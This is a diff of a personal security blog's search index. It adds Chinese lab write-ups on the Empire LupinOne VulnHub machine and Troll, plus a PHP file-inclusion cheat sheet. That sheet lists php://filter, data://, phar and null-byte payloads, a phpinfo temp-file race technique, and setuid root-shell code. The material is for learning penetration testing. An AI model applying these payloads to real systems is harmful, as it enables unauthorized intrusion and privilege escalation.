@@ -689,6 +689,133 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
       </tags>
   </entry>
   <entry>
+    <title>empire_lupin_one</title>
+    <url>/2023/07/05/empire-lupin-one/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>sudo提权的一次尝试</p>
+<span id="more"></span>
+<p>端口扫描</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705210731522.png" alt="image-20230705210731522"></p>
+<p>一个ssh一个http，爆破目录</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705210819397.png" alt="image-20230705210819397"></p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705210943316.png" alt="image-20230705210943316"></p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705211014281.png" alt="image-20230705211014281"></p>
+<p>访问~myfiles<br><img src="/2023/07/05/empire-lupin-one/image-20230705211047343.png" alt="image-20230705211047343"><br>沿着这个目录爆破什么都没有，fuzz查询一下</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705211432688.png" alt="image-20230705211432688"></p>
+<p>找到一个~secret，访问一下<br><img src="/2023/07/05/empire-lupin-one/image-20230705211604560.png" alt="image-20230705211604560"></p>
+<p>得到一个用户名icex64和ssh密码提示，使用hydra对密码进行爆破，上面提到fasttrack，find / -name fasttrack得到fasttrack.txt密码本，使用hydra爆破ssh密码，可惜失败了</p>
+<p>密码不是这个里面的。沿着目录在fuzz一下<br><img src="/2023/07/05/empire-lupin-one/image-20230705214220136.png" alt="image-20230705214220136"><br><img src="/2023/07/05/empire-lupin-one/image-20230705214236360.png" alt="image-20230705214236360"><br>这次扫出来的界面和之前是一样的<br><img src="/2023/07/05/empire-lupin-one/image-20230705214316951.png" alt="image-20230705214316951"></p>
+<p>多次尝试无果，想到了上图说他隐藏了，可能是隐藏文件，换一个爆破软件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">ffuf -u <span class="string">&quot;http://192.168.153.131/~secret/.FUZZ&quot;</span> -w <span class="string">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> -e <span class="string">.txt</span>,<span class="string">.pub</span>,<span class="string">.html</span>,<span class="string">.bak</span> -mc 200</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705220346612.png" alt="image-20230705220346612"></p>
+<p>访问一下mysecret.txt<br><img src="/2023/07/05/empire-lupin-one/image-20230705220444838.png" alt="image-20230705220444838"></p>
+<p>得到文件但是看起来不像ssh私钥，可能是编码了，解码一下：<a href="http://www.hiencode.com/">http://www.hiencode.com/</a></p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705220812084.png" alt="image-20230705220812084"></p>
+<p>base58解码后看起来就像ssh私钥了</p>
+<p>使用ssh2john将私钥转化成hash文件，然后john才能使用<br><img src="/2023/07/05/empire-lupin-one/image-20230705222257845.png" alt="image-20230705222257845"></p>
+<p>破解出密码：<br><img src="/2023/07/05/empire-lupin-one/image-20230705222703473.png" alt="image-20230705222703473"></p>
+<p>ssh连接<br><img src="/2023/07/05/empire-lupin-one/image-20230705223316910.png" alt="image-20230705223316910"><br>提示权限拒绝</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">600</span> privatekey</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230705223745792.png" alt="image-20230705223745792"></p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> -l <span class="comment">#查看可执行的sudo命令</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706214020889.png" alt="image-20230706214020889"></p>
+<p>发现一个以arsene执行不需要密码的py文件</p>
+<p>查看该文件</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706213957912.png" alt="image-20230706213957912"></p>
+<p>导入了一个webbrowser包，打印了一句话，调用open函数打开一个网站。</p>
+<p>继续收集信息</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706214305201.png" alt="image-20230706214305201"></p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span>mp!<span class="built_in">r3</span>&#123;I_See_That_You_Manage_To_Get_My_Bunny&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706214524860.png" alt="image-20230706214524860"></p>
+<p>呕吼sercet文件，可以权限不够，还有其他零零散散的信息，但是并不能找到arsene的密码，回头查看webbrowser包</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706214939682.png" alt="image-20230706214939682"></p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706215304109.png" alt="image-20230706215304109"></p>
+<p>好高的权限，都可以写入，那么之前调用了open函数，那就在open函数中返回一个shell</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706214923827.png" alt="image-20230706214923827"></p>
+<p>执行命令后发现已经成为了arsene，原理看sudo提权<br><img src="/2023/07/05/empire-lupin-one/image-20230706215436286.png" alt="image-20230706215436286"></p>
+<p>速速查看.sercet文件和收集信息<br><img src="/2023/07/05/empire-lupin-one/image-20230706215558401.png" alt="image-20230706215558401"></p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706215636365.png" alt="image-20230706215636365"></p>
+<p>执行sudo -l</p>
+<p><img src="/2023/07/05/empire-lupin-one/image-20230706215654858.png" alt="image-20230706215654858"></p>
+<p>可以以root身份执行pip，使用pip提权，正向反向都可<br><img src="/2023/07/05/empire-lupin-one/image-20230706215846325.png" alt="image-20230706215846325"></p>
+<p>正向shell<br><img src="/2023/07/05/empire-lupin-one/image-20230706221134994.png" alt="image-20230706221134994"><br>提权完成</p>
+<p>本次渗透知识点</p>
+<ol>
+<li>wfuzz和ffuf的fuzz测试找到敏感文件</li>
+<li>ssh2john生成hash文件并用john进行解密得到密码</li>
+<li>在webbrowser中构建恶意代码反弹shell获取目标用户</li>
+<li>sudo提权：通过目标用户被赋予root执行pip命令完成提权</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>phpinfo包含临时文件</title>
+    <url>/2023/07/04/phpinfo%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。<br>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。<br>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。<br>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。<br>这个时候就需要用到条件竞争，具体流程如下：</p>
+<ul>
+<li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li>
+<li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li>
+<li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li>
+<li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>
+<li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li>
+<li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>file_include</title>
+    <url>/2023/07/04/file-include/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞（File Inclusion Vulnerability）是一种Web应用程序常见的安全漏洞，也是攻击者常用的攻击手段之一。这种漏洞通常存在于代码中，允许攻击者将未经过滤的输入作为参数传递给文件包含函数（如include()、require()等），从而加载恶意脚本或者敏感文件到服务器上，并进一步攻击系统。攻击者可以通过该漏洞窃取敏感信息、执行任意命令、控制服务器等。</p>
+<h2 id="文件包含漏洞类型"><a href="#文件包含漏洞类型" class="headerlink" title="文件包含漏洞类型"></a>文件包含漏洞类型</h2><p>常见的文件包含漏洞有两种类型：<br>1.本地文件包含（LFI）：攻击者通过提交恶意请求，可以访问服务器上本地已存在的文件。这种漏洞通常发生在应用程序没有对用户输入进行过滤的情况下，接受用户的输入来指定文件名或者路径，并将其传递给包含函数的时候。<br>2.远程文件包含（RFI）：攻击者通过构造一个URL链接，将远程服务器上的恶意脚本地址传递给包含函数，从而导致远程服务器上的脚本被执行。</p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">php.ini</span><br><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_include:on</span><br></pre></td></tr></table></figure>
+<h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="本地文件包含配合日志文件"><a href="#本地文件包含配合日志文件" class="headerlink" title="本地文件包含配合日志文件"></a>本地文件包含配合日志文件</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">？<span class="keyword">default</span>=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>burp修改请求头配合日志文件进行攻击。</p>
+<h3 id="php-fifter协议"><a href="#php-fifter协议" class="headerlink" title="php://fifter协议"></a>php://fifter协议</h3><p>主要用来查看源码/直接包含php文件时会被解析，需要用协议来读取。</p>
+<p>/convert.base64-encode：转换器编码</p>
+<p>/resource=[filename]：目标文件过滤的流</p>
+<p>使用方式：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">？<span class="built_in">file</span>=php：<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br><span class="line">通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行，虽然不能直接获取到<span class="built_in">shell</span>等，但能读取敏感文件危害也是挺大的，同时也能够对网站源码进行审计。</span><br><span class="line">？<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br><span class="line">效果跟前面一样，只是少了个<span class="built_in">read</span>关键字，在绕过一些waf时也许有用。</span><br></pre></td></tr></table></figure>
+<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h3><p>?file=file://[文件绝对路径+文件名]</p>
+<p>专门用于访问本地文件系统，可以对本地文件进行读取</p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>注意：entype=”multipart/form-data”时，该协议是无效的</p>
+<p><img src="/2023/07/04/file-include/file_include\image-20230704153917485.png" alt="image-20230704153917485"></p>
+<p><img src="/2023/07/04/file-include/file_include\image-20230704153938051.png" alt="image-20230704153938051"></p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>支持zip、phar格式的文件包含</p>
+<h4 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h4><p>利用条件：php版本大于等于5.3.0</p>
+<p>配合文件上传漏洞，当仅可以上传zip格式时。</p>
+<p>配合文件上传漏洞，当仅可以上传图片格式</p>
+<p><img src="/2023/07/04/file-include/file_include\image-20230704155348343.png" alt="image-20230704155348343"></p>
+<h4 id="phar-1"><a href="#phar-1" class="headerlink" title="phar"></a>phar</h4><p>利用条件：php.ini中phar.readonly=off</p>
+<p><img src="/2023/07/04/file-include/file_include\image-20230704155415286.png" alt="image-20230704155415286"></p>
+<p>编写恶意phar文件的php脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;shell.txt&quot;</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);  <span class="comment">//压缩的文件和内容</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  <span class="comment">//计算签名</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/04/file-include/file_include\image-20230704160059102.png" alt="image-20230704160059102"></p>
+<p>更改文件后缀可以绕过一些限制</p>
+<p><img src="/2023/07/04/file-include/file_include\image-20230704160131320.png" alt="image-20230704160131320"></p>
+<h3 id="zip-1"><a href="#zip-1" class="headerlink" title="zip://"></a>zip://</h3><p>使用zip协议时需要将#编码为%23</p>
+<p><img src="/2023/07/04/file-include/image-20230704160342014.png" alt="image-20230704160342014"></p>
+<p>利用条件：php&gt;=5.2(绝对路径)    php&gt;=5.29(相对/绝对路径)</p>
+<p><img src="/2023/07/04/file-include/file_include\image-20230704160342014.png" alt="image-20230704160342014"></p>
+<p><img src="/2023/07/04/file-include/image-20230704160407033.png" alt="image-20230704160407033"></p>
+<p>不管后缀是什么都会当成zip文件来解压</p>
+<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p><img src="/2023/07/04/file-include/image-20230704160533301.png" alt="image-20230704160533301"></p>
+<p>利用条件</p>
+<p><img src="/2023/07/04/file-include/image-20230704160601204.png" alt="image-20230704160601204"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">？file=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="bypass-指定前缀"><a href="#bypass-指定前缀" class="headerlink" title="bypass-指定前缀"></a>bypass-指定前缀</h3><p>测试代码<br><img src="/2023/07/04/file-include/image-20230704162158655.png" alt="image-20230704162158655"></p>
+<h4 id="LFI-目录遍历"><a href="#LFI-目录遍历" class="headerlink" title="LFI-目录遍历"></a>LFI-目录遍历</h4><p><img src="/2023/07/04/file-include/image-20230704162255443.png" alt="image-20230704162255443"></p>
+<h4 id="LFI-编码绕过"><a href="#LFI-编码绕过" class="headerlink" title="LFI-编码绕过"></a>LFI-编码绕过</h4><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">url编码</span><br><span class="line">../		<span class="meta">%</span><span class="number">2</span>e<span class="meta">%</span><span class="number">2</span>e<span class="meta">%</span><span class="number">2</span>f、<span class="meta">%</span><span class="number">2</span>e<span class="meta">%</span><span class="number">2</span>e/、..<span class="meta">%</span><span class="number">2</span>f</span><br><span class="line">二次编码</span><br><span class="line">../ 	<span class="meta">%</span><span class="number">252</span>e<span class="meta">%</span><span class="number">252</span>e<span class="meta">%</span><span class="number">252</span>f</span><br></pre></td></tr></table></figure>
+<h3 id="bypass-指定后缀"><a href="#bypass-指定后缀" class="headerlink" title="bypass-指定后缀"></a>bypass-指定后缀</h3><p><img src="/2023/07/04/file-include/image-20230704162608395.png" alt="image-20230704162608395"></p>
+<h4 id="RFI-URL"><a href="#RFI-URL" class="headerlink" title="RFI-URL"></a>RFI-URL</h4><p>利用query或fragment来绕过后缀限制</p>
+<p>[protocol]://hostname[:port]/path/[filename] [?query] [#fragment]</p>
+<h4 id="LFI-压缩协议"><a href="#LFI-压缩协议" class="headerlink" title="LFI-压缩协议"></a>LFI-压缩协议</h4><p>构造特定zip包，index.php写恶意payload</p>
+<p><img src="/2023/07/04/file-include/image-20230704163203985.png" alt="image-20230704163203985"></p>
+<h4 id="零字节截断"><a href="#零字节截断" class="headerlink" title="零字节截断"></a>零字节截断</h4><p>利用条件：php &lt; 5.3.4</p>
+<p>payload：index.php?file=phpinfo.php%00</p>
+<h3 id="协议限制"><a href="#协议限制" class="headerlink" title="协议限制"></a>协议限制</h3><p><img src="/2023/07/04/file-include/image-20230704163540860.png" alt="image-20230704163540860"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload：?filename=compress.zlib:<span class="comment">//data:/text/plain;base64,PD9waHAgcGhwaW5mbygp0z8%2b</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>经过base64编码PD9waHAgcGhwaW5mbygpOz8+，最后的+需要写成%<span class="number">2</span>b</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
     <title>js原型链污染</title>
     <url>/2023/07/02/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>原型对象的学习和污染</p>
@@ -1014,8 +1141,6 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p>textarea语法规则如下<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630164955883.png" alt="image-20230630164955883"></p>
 <p>所以直接使用</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<script>alert(1)</script>
-
 <p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630164753959.png" alt="image-20230630164753959"></p>
 <p>当该浏览审核通过后发现其他登录的用户进入留言本也会触发<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630165525192.png" alt="image-20230630165525192"></p>
 <p>证明存在存储型xss漏洞</p>
@@ -1129,6 +1254,12 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
     <url>/2023/06/27/AI-WEB-1-0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>思路：进行主机、端口扫描后进行drib进行目录爆破——找到sql注入页面——获取os-shell——反弹shell至攻击机——提权</p>
 <span id="more"></span>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
+<li>drib爆破目录进行信息收集</li>
+<li>sqlmap os-shell</li>
+<li>虚拟机无nc -e命令时绕过</li>
+<li>提权：内核版本漏洞提权、passwd构建root用户提权</li>
+</ol>
 <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p>
 <h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>kali、sqlmap、answord、burp suite</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫描靶机地址"><a href="#扫描靶机地址" class="headerlink" title="扫描靶机地址"></a>扫描靶机地址</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230627204534720.png" alt="image-20230627204534720"></p>
@@ -1220,7 +1351,9 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
   <entry>
     <title>FTP</title>
     <url>/2023/06/26/FTP/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>3CDaemon</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>FTP协议的探索</p>
+<span id="more"></span>
+<h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>3CDaemon</p>
 <h2 id="FTP匿名登陆"><a href="#FTP匿名登陆" class="headerlink" title="FTP匿名登陆"></a>FTP匿名登陆</h2><div class="table-container">
 <table>
 <thead>
@@ -1259,6 +1392,13 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
     <title>Troll</title>
     <url>/2023/06/26/Troll/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权)</p>
+<span id="more"></span>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><ol>
+<li>ftp匿名登陆</li>
+<li>wireshark分析包</li>
+<li>hydra破解密码</li>
+<li>提权：内核版本漏洞提权、定时任务提权：ssh提权和文件特性提权</li>
+</ol>
 <h3 id="nmap或netdiscover进行主机发现"><a href="#nmap或netdiscover进行主机发现" class="headerlink" title="nmap或netdiscover进行主机发现"></a>nmap或netdiscover进行主机发现</h3><p><img src="/2023/06/26/Troll/image-20230626192813401.png" alt="image-20230626192813401"></p>
 <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193035047.png" alt="image-20230626193035047"></p>
 <p>看到了三个开启的tcp端口</p>
@@ -1313,7 +1453,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p>该payload生成了一个文件/root/.ssh/authorized_keys，等待两分钟后cronlog触发cleaner.py就可以使用root直接登录靶机</p>
 <h4 id="文件特性提权"><a href="#文件特性提权" class="headerlink" title="文件特性提权"></a>文件特性提权</h4><p>构造两个文件分别是suid.c和suid.py</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudi.c</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># suid.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">    os.system(<span class="string">&#x27;chown root:root /tmp/suid; chmod 4777 /tmp/suid&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
-<p>靶机通过wget获取文件到/tmp路径下，编译suid.c文件，将sudi.py写入/lib/log/cleaner.py中，等待suid的属组变成root，执行./suid即可</p>
+<p>靶机通过wget获取文件到/tmp路径下，编译suid.c文件，将suid.py写入/lib/log/cleaner.py中，等待suid的属组变成root，执行./suid即可</p>
 <p><img src="/2023/06/26/Troll/image-20230627122510260.png" alt="image-20230627122510260"></p>
 ]]></content>
       <categories>
@@ -1411,7 +1551,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
   <entry>
     <title>反序列化</title>
     <url>/2023/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><span id="more"></span>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>常见的反序列化漏洞</p>
+<span id="more"></span>
 <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>PHP反序列化是一种将序列化数据还原为原始PHP对象或数据结构的过程。序列化是将PHP对象或数据转换为字符串的过程，可以将其存储、传输或持久化。反序列化则是将序列化的字符串重新还原为PHP对象或数据。</p>
 <p>在PHP中，常见的序列化格式是通过<code>serialize()</code>和<code>unserialize()</code>函数来实现的。<code>serialize()</code>函数将PHP对象或数据序列化为字符串，而<code>unserialize()</code>函数将序列化的字符串反序列化为原始对象或数据。</p>
 <p>然而，反序列化操作也存在安全风险，因为恶意用户可以构造恶意的序列化数据，通过利用对象的自动反序列化行为来执行未经授权的操作。这可能导致安全漏洞，如远程代码执行（RCE）或敏感数据泄露。</p>
@@ -1912,6 +2053,12 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">常规扫描 nikto -h<span class="regexp">/-host url/i</span>p</span><br><span class="line">指定端口 -p</span><br><span class="line">指定协议 -&lt;协议&gt; eg:-ssl</span><br><span class="line">指定目录 -c</span><br><span class="line">多目标扫描 写入文本中，通过 -host 文本名</span><br><span class="line">绕过IDS检测 -evasion</span><br><span class="line">扫描结果输出 -F csv<span class="regexp">/htm/</span>txt<span class="regexp">/xml/m</span>sf+</span><br></pre></td></tr></table></figure>
 <h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><p>web内容扫描程序。查找现有和隐藏的web对象。基本上是通过对web服务器发起基于字典的攻击并分析响应来工作的。</p>
 <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">端口扫描：nmap <span class="attr">--min-rate</span> <span class="number">10000</span> -<span class="selector-tag">p</span>- ip</span><br><span class="line">TCP：-sT</span><br><span class="line">UDP：-sU</span><br><span class="line">服务扫描：</span><br></pre></td></tr></table></figure>
+<h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><p>模糊测试</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">wfuzz -w <span class="regexp">/usr/</span>share<span class="regexp">/wfuzz/</span>wordlist<span class="regexp">/general/</span>common.txt <span class="number">192.168</span>.<span class="number">153.131</span><span class="regexp">/~secret/</span>FUZZ.txt | <span class="keyword">grep</span> -v <span class="number">404</span></span><br></pre></td></tr></table></figure>
+<h2 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h2><p>模糊测试</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">ffuf -u <span class="string">&quot;http://192.168.153.131/~secret/.FUZZ&quot;</span> -w <span class="string">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> -e <span class="string">.txt</span>,<span class="string">.pub</span>,<span class="string">.html</span>,<span class="string">.bak</span> -mc 200</span><br></pre></td></tr></table></figure>
+<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>爆破hash文件密码</p>
